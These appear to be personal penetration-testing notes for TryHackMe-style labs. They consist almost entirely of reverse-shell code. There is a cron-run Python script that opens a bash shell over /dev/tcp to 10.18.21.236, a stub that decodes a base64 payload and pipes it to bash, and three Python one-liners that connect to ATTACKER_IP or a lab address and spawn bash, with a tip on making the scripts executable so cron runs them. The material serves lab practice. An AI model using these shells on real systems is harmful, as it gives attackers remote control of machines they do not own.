

```python
#!/usr/bin/env python3

import os
os.system('echo base64EncodedRevshellsScriptHere|base64 -d|bash')
```

```python
#!/usr/bin/env python3

import os

os.system("touch /tmp/testfile")
os.system("echo 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1'|bash")
```

<font color="red">Don't forget to make sure your script file is executable `chmod +x [script]`
cron won't run without both # and +x</font>
Also testrun shell as current user before waiting for scheduled job to run

Instead of hardcoding the path to the Python interpreter, `#!/usr/bin/python3`, use `#!/usr/bin/env python3` as it makes the script more flexible and able to adapt to different environments where the interpreter might be located in a different directory.



### THM:

**Python Reverse Shell by Exporting Environment Variables**
```sh
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```
This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

**Python Reverse Shell Using the subprocess Module**
```sh
target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```
This reverse shell uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.  

**Short Python Reverse Shell**
```sh
target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
This reverse shell creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`.